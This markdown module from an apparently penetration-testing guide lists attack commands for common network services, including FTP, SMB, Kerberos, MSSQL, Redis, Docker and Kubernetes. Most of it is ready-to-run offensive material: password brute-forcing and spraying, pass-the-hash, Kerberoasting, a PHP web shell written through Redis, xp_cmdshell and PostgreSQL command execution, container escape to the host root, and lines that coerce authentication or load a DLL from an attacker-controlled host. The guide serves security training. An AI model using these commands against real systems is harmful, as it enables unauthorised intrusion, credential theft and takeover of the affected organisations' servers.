# 18 — Attacking Common Services

[11 Footprinting](11-footprinting.md) covers enumeration. This module covers the *attack* once a service is identified — abuse paths, common exploit patterns, and credential / RCE techniques per protocol.

## Contents

- [FTP — 21](#ftp-21)
- [SSH — 22](#ssh-22)
- [Telnet — 23](#telnet-23)
- [SMTP — 25 / 465 / 587](#smtp-25-465-587)
- [DNS — 53](#dns-53)
- [TFTP — 69 udp](#tftp-69-udp)
- [Finger — 79](#finger-79)
- [HTTP — 80 / 443](#http-80-443)
- [POP3 / IMAP — 110 / 143 / 993 / 995](#pop3-imap-110-143-993-995)
- [RPC / DCERPC — 111 / 135](#rpc-dcerpc-111-135)
- [NetBIOS / SMB — 139 / 445](#netbios-smb-139-445)
- [SNMP — 161/162 udp](#snmp-161162-udp)
- [LDAP — 389 / 636 / 3268 / 3269](#ldap-389-636-3268-3269)
- [Kerberos — 88](#kerberos-88)
- [SQL services](#sql-services)
- [RDP — 3389](#rdp-3389)
- [WinRM — 5985 / 5986](#winrm-5985-5986)
- [VNC — 5900-5906](#vnc-5900-5906)
- [Database / app services](#database-app-services)
- [Sources](#sources)

## FTP — 21

```bash
# Anonymous write → web shell on a co-hosted webserver
ftp <T>
> Name: anonymous
> ftp> put shell.php

# FTP bounce (legacy)
nmap -b anonymous:@<T> -p 1-65535 <internal-host>

# Credential brute (low rate; many FTP daemons lock)
hydra -L users.txt -P passwords.txt ftp://<T> -t 4 -f

# Read site config / logs as anonymous (often miscconfigured)
wget -r ftp://anonymous:@<T>/

# Specific CVEs to remember
# - vsftpd 2.3.4 backdoor (CVE-2011-2523): ":)" smiley in user → port 6200
# - ProFTPD 1.3.5 mod_copy (CVE-2015-3306): SITE CPFR/CPTO arbitrary file copy
```

## SSH — 22

```bash
# Brute / spray
hydra -L users.txt -P passwords.txt ssh://<T> -t 4 -f
netexec ssh hosts.txt -u root -P passwords.txt

# Reuse keys you found elsewhere
chmod 600 id_rsa; ssh -i id_rsa user@<T>

# Crack a passphrase-protected key
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=rockyou.txt

# SSH agent hijacking (target box, your low-priv shell)
SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.PID ssh-add -L
SSH_AUTH_SOCK=/tmp/ssh-XXX/agent.PID ssh user@otherhost

# Common abuse
# - .ssh/authorized_keys is writable → drop your pubkey
# - .ssh/config has IdentityFile entries pointing at private keys
# - Passwords with PasswordAuthentication=yes (default off in Kali, on elsewhere)
# - Old hostkey algorithms enabled
```

CVEs to verify by version: `Libssh auth bypass CVE-2018-10933`, OpenSSH user-enum (≤7.7) `CVE-2018-15473`.

## Telnet — 23

```bash
nmap -p23 -sCV --script telnet-encryption,telnet-ntlm-info <T>

# Default creds against IoT / network gear
hydra -L users.txt -P passwords.txt telnet://<T>
```

Always check banner — many embedded devices accept `admin/admin`, blank passwords, or are fully unauthenticated.

## SMTP — 25 / 465 / 587

```bash
# User enumeration (VRFY/EXPN/RCPT)
smtp-user-enum -M VRFY -U users.txt -t <T>
smtp-user-enum -M RCPT -U users.txt -D <domain> -t <T>

# Open relay test
swaks --to victim@external.tld --from spoofed@target.tld --server <T>
swaks --to victim@external.tld --from sender@<T> --server <T> --auth-user u --auth-password p

# Send phishing payload (with explicit authorization)
swaks --to user@target --from billing@target --server smtp.attacker.tld \
  --header "Subject: Invoice" --body @body.txt --attach @inv.docx
```

Common findings: open relay, weak STARTTLS, anonymous AUTH, NTLM info leak (if it's an Exchange front).

## DNS — 53

```bash
# Zone transfer
dig AXFR <domain> @<NS>

# Cache snooping (non-recursive lookups)
dig +norecurse @<DNS> www.target.tld

# DNS NSUPDATE (auth disabled)
nsupdate <<EOF
server <T>
update add evil.target.tld 60 A 1.2.3.4
send
EOF

# DNSAdmins → DC RCE (if your account is in DNSAdmins on a Windows DNS)
# Build a malicious DLL, then:
dnscmd <DC> /config /serverlevelplugindll \\<ATTACKER>\share\evil.dll
sc \\<DC> stop dns && sc \\<DC> start dns
```

## TFTP — 69 udp

```bash
nmap -sU -p69 --script tftp-enum <T>

tftp <T>
> get config.cfg
> put shell.php
```

Network gear often exposes TFTP with router/switch configs in cleartext.

## Finger — 79

```bash
finger @<T>
finger root@<T>
finger-user-enum.pl -U users.txt -t <T>
```

## HTTP — 80 / 443

Out-of-scope for this module — see web modules 21-31.

But two protocol-level attacks worth remembering:

- **Host header injection / vhost-routing confusion** — ([12 Web Recon](12-information-gathering-web.md), [30 Web Attacks](30-web-attacks.md)).
- **Request smuggling / desync** — covered in [30](30-web-attacks.md).

## POP3 / IMAP — 110 / 143 / 993 / 995

```bash
# Login brute
hydra -L users.txt -P passwords.txt -s 110 <T> pop3
hydra -L users.txt -P passwords.txt -s 143 <T> imap
hydra -L users.txt -P passwords.txt -s 993 -S <T> imap   # SSL

# Manual (POP3)
nc <T> 110
USER alice
PASS Password1
LIST
RETR 1

# Manual (IMAP)
ncat --ssl <T> 993
A1 LOGIN alice Password1
A2 LIST "" "*"
A3 SELECT INBOX
A4 FETCH 1 BODY[]
```

NTLM-info disclosure on Exchange: `nmap --script imap-ntlm-info,pop3-ntlm-info` returns the AD domain/host.

## RPC / DCERPC — 111 / 135

```bash
rpcinfo -p <T>
rpcclient -U "" -N <T>
> querydominfo
> enumdomusers
> queryuser 0x3e8
> netshareenumall

# Authenticated
rpcclient -U 'corp\alice%Pass1' <T>

# Coerce auth to attacker (PetitPotam / PrinterBug / ShadowCoerce / DFSCoerce)
PetitPotam.py <ATTACKER> <DC>
```

Coerced auth → NTLM relay → AD CS / shadow credentials / RBCD: see [20 AD](20-active-directory-attacks.md).

## NetBIOS / SMB — 139 / 445

```bash
# Authentication options
netexec smb <T> -u alice -p Pass1
netexec smb <T> -u alice -H <NThash>            # pass-the-hash
netexec smb <T> -u alice --kerberos             # use TGT in $KRB5CCNAME
netexec smb <T> -u '' -p ''                     # null
netexec smb <T> -u guest -p ''                  # guest

# Spraying
netexec smb <DC> -u users.txt -p 'Spring2025!' --continue-on-success

# Useful module flags
netexec smb <T> -u u -p p --shares
netexec smb <T> -u u -p p --users --groups --pass-pol
netexec smb <T> -u u -p p --rid-brute
netexec smb <T> -u u -p p --loggedon-users
netexec smb <T> -u u -p p --sessions
netexec smb <T> -u u -p p --sam --lsa --ntds   # admin only

# Execution methods
netexec smb <T> -u Administrator -p Pass1 -x 'whoami'
netexec smb <T> -u Administrator -p Pass1 --exec-method smbexec -x 'whoami'

# Impacket equivalents
impacket-smbclient corp/alice:Pass1@<T>
impacket-smbexec corp/alice:Pass1@<T>
impacket-psexec corp/Administrator:Pass1@<T>
impacket-wmiexec corp/Administrator:Pass1@<T>
impacket-atexec corp/Administrator:Pass1@<T> 'whoami /all'
impacket-dcomexec corp/Administrator:Pass1@<T>
```

Classic CVEs to check by SMB version + signing state:

- **MS17-010 (EternalBlue)** — `nmap --script smb-vuln-ms17-010`. Metasploit `exploit/windows/smb/ms17_010_eternalblue`.
- **MS08-067** — old Windows 2000/XP/2003.
- **SMBGhost (CVE-2020-0796)** — Windows 10 1903/1909.
- **PrintNightmare (CVE-2021-1675 / CVE-2021-34527)** — print spooler RCE.
- **ZeroLogon (CVE-2020-1472)** — Netlogon, often classed under MS-NRPC; full DC takeover via empty challenge.

## SNMP — 161/162 udp

```bash
# Brute community strings
onesixtyone -c communities.txt <T>

# Walk and grep for creds (community strings sometimes contain `private`)
snmpwalk -v2c -c public <T> | grep -i password

# Write OIDs (rare but devastating where v1/v2c with rw is left)
snmpset -v2c -c private <T> <oid> s "value"
```

## LDAP — 389 / 636 / 3268 / 3269

```bash
# Anonymous
ldapsearch -x -H ldap://<DC> -s base -b "" "(objectClass=*)"

# Authenticated
ldapsearch -x -H ldap://<DC> -D 'corp\alice' -w Pass1 -b "DC=corp,DC=local" "(objectClass=user)"

# LDAP password / NTLM auth coerce / pass-the-hash via SASL
nxc ldap <DC> -u alice -p Pass1
nxc ldap <DC> -u alice -H <NThash>

# LDAP injection in apps that build queries from user input
'(uid=*)(uid=*'  '))(|(uid=*'  '*)(uid=admin'
```

## Kerberos — 88

```bash
# AS-REP roast (DONT_REQ_PREAUTH on target accounts)
impacket-GetNPUsers -dc-ip <DC> -no-pass corp/

# Kerberoast
impacket-GetUserSPNs -request -dc-ip <DC> corp/alice:Pass1

# Pre-auth bruteforce / userenum (no lockout, AS-REQ failures don't increment badPwdCount)
kerbrute userenum -d corp.local --dc <DC> users.txt
kerbrute passwordspray -d corp.local --dc <DC> users.txt 'Spring2025!'

# Pass-the-ticket
export KRB5CCNAME=alice.ccache
impacket-psexec -k -no-pass corp/alice@host01.corp.local
```

Detail of all AD attacks: see [20](20-active-directory-attacks.md).

## SQL services

### MSSQL — 1433

```bash
# Auth
impacket-mssqlclient corp/alice:Pass1@<T> -windows-auth
impacket-mssqlclient sa:Pass1@<T>

netexec mssql <T> -u sa -p Pass1
netexec mssql <T> -u sa -p Pass1 -x 'whoami'

# Execute OS commands
EXEC sp_configure 'show advanced options',1; RECONFIGURE;
EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;
EXEC xp_cmdshell 'whoami';

# Coerce SMB authentication
EXEC xp_dirtree '\\<ATTACKER>\share';      -- captures NetNTLMv2 on Responder
EXEC xp_fileexist '\\<ATTACKER>\share\x';

# Read files
EXEC xp_cmdshell 'type C:\Windows\System32\drivers\etc\hosts';
SELECT * FROM OPENROWSET(BULK 'C:\file.txt', SINGLE_CLOB) AS x;

# Linked servers (pivot)
SELECT srvname, isremote FROM sysservers;
EXEC ('xp_cmdshell ''whoami''') AT [LINKED-SRV];

# Impersonation chains
SELECT distinct b.name FROM sys.server_permissions a INNER JOIN sys.server_principals b ON a.grantor_principal_id = b.principal_id WHERE a.permission_name = 'IMPERSONATE';
EXECUTE AS LOGIN = 'sa'; SELECT SYSTEM_USER;
```

### MySQL / MariaDB — 3306

```bash
mysql -h <T> -u root -p
mysql -h <T> -u root --password=''            # empty password

# UDF for RCE on writable plugin dir
# ... advanced; see HackTricks

# Read files via INTO OUTFILE / LOAD DATA INFILE (FILE privilege required)
SELECT LOAD_FILE('/etc/passwd');
SELECT 'data' INTO OUTFILE '/var/www/html/x.php';
```

### PostgreSQL — 5432

```bash
psql -h <T> -U postgres
# Default `trust` auth on localhost is occasionally exposed externally.

# RCE via COPY ... PROGRAM (Postgres 9.3+, superuser)
DROP TABLE IF EXISTS x;
CREATE TABLE x(t text);
COPY x FROM PROGRAM 'id';
SELECT * FROM x;
```

### Oracle TNS — 1521

```bash
odat all -s <T>
odat sidguesser -s <T>
odat passwordguesser -s <T> -d <SID> -U users.txt -P passwords.txt
odat externaltable -s <T> -d <SID> -U scott -P tiger --sysdba --exec /tmp ls
```

## RDP — 3389

```bash
# Brute / spray (lock-out aware)
netexec rdp <T> -u users.txt -p 'Spring2025!' --continue-on-success
hydra -L users.txt -P passwords.txt rdp://<T>

# Connect with passwords / NThash
xfreerdp /u:alice /d:corp /p:Pass1 /v:<T> /dynamic-resolution +clipboard /drive:share,/tmp
xfreerdp /u:alice /d:corp /pth:<NThash> /v:<T>

# BlueKeep (CVE-2019-0708) — only against unsupported Windows; check, don't pop in prod.
# DejaBlue (CVE-2019-1181/1182).
```

Session hijacking with `tscon` (admin on the host) gives you a logged-on user's interactive session without their password.

## WinRM — 5985 / 5986

```bash
netexec winrm <T> -u alice -p Pass1
netexec winrm <T> -u alice -H <NThash>

evil-winrm -i <T> -u alice -p Pass1
evil-winrm -i <T> -u alice -H <NThash>
evil-winrm -i <T> -u alice -p Pass1 -s ./scripts/   # script dir → Invoke-Binary helpers
```

WinRM is RPC-over-HTTP; HTTPS variant uses port 5986.

## VNC — 5900-5906

```bash
nmap -p5900 -sCV --script vnc-info <T>
vncviewer <T>
medusa -h <T> -u root -P passwords.txt -M vnc

# Old RealVNC auth bypass: CVE-2006-2369 (some patched-old versions vulnerable to type-2 auth selection)
```

## Database / app services

### Redis — 6379

```bash
redis-cli -h <T>
> INFO
> CONFIG GET *
> CONFIG SET dir /var/www/html
> CONFIG SET dbfilename shell.php
> SET x "<?php system($_GET['c']); ?>"
> SAVE

# Or write SSH key
> CONFIG SET dir /home/redis/.ssh
> CONFIG SET dbfilename authorized_keys
> SET x "\n\n<your-pubkey>\n\n"
> SAVE
```

### Elasticsearch — 9200

```bash
curl http://<T>:9200/_cat/indices?v
curl http://<T>:9200/<idx>/_search?pretty&size=10000

# Old script engine RCE (Elasticsearch 1.x): CVE-2014-3120, CVE-2015-1427
```

### Memcached — 11211

```bash
echo -e 'stats\nstats slabs\nquit' | nc <T> 11211
memcdump --servers=<T>
```

### MongoDB — 27017

```bash
mongo --host <T>
> show dbs; use <db>; show collections; db.<col>.find().pretty()
# Old default: no auth. Modern Mongo enforces auth.
```

### Docker API — 2375 / 2376

Unauth Docker API == root on the host:

```bash
docker -H tcp://<T>:2375 ps
docker -H tcp://<T>:2375 run -v /:/host -it alpine chroot /host sh
```

### Kubernetes API — 6443 / 8443 / 10250 (kubelet)

```bash
curl -sk https://<T>:6443/api/v1/namespaces            # anon access?
curl -sk https://<T>:10250/pods                         # kubelet anon
curl -sk https://<T>:10250/run/<ns>/<pod>/<container> -d "cmd=id"
```

## Sources

- HackTricks — Pentesting Network Services: https://book.hacktricks.wiki/en/network-services-pentesting/
- Impacket: https://github.com/fortra/impacket
- NetExec wiki: https://www.netexec.wiki/
- The Hacker Recipes: https://www.thehacker.recipes/
- MSRC advisories (for CVEs cited): https://msrc.microsoft.com/
